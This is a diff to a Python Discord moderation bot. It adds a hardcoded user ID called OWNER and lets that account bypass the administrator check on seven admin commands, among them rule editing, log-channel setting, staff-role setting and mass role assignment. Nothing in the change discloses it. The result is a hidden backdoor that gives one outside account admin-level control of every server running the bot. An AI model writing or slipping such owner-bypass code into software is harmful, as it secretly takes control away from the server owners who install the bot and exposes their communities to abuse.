@@ -6,6 +6,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("TOKEN")
+OWNER = 1306137346583826452
 
 intents = discord.Intents.all()
 
@@ -71,7 +72,7 @@ async def on_ready():
 
 @bot.command()
 async def setlogchannel(ctx, channel: discord.TextChannel):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
@@ -85,7 +86,7 @@ async def setlogchannel(ctx, channel: discord.TextChannel):
 
 @bot.command()
 async def addrule(ctx, name: str, triggers: str, amount: int, time: int, punishment: str):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
@@ -102,7 +103,7 @@ async def addrule(ctx, name: str, triggers: str, amount: int, time: int, punishm
 
 @bot.command()
 async def removerule(ctx, name: str):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
@@ -119,7 +120,7 @@ async def removerule(ctx, name: str):
 
 @bot.command()
 async def togglebots(ctx, value: str):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
@@ -136,7 +137,7 @@ async def togglebots(ctx, value: str):
 
 @bot.command()
 async def listrules(ctx):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.embed(
             title="error!",
             description="you must be an administrator to run this command.",
@@ -180,7 +181,7 @@ async def admin_list(ctx, show_bots: str = "false"):
 
 @bot.command()
 async def setstaffrole(ctx, role: discord.Role):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
@@ -283,7 +284,7 @@ async def help(ctx):
 
 @bot.command()
 async def massrole(ctx, role: discord.Role):
-    if not ctx.author.guild_permissions.administrator:
+    if not ctx.author.guild_permissions.administrator and ctx.author.id != OWNER:
         embed = discord.Embed(
             title="Error!",
             description="You must be an administrator to run this command.",
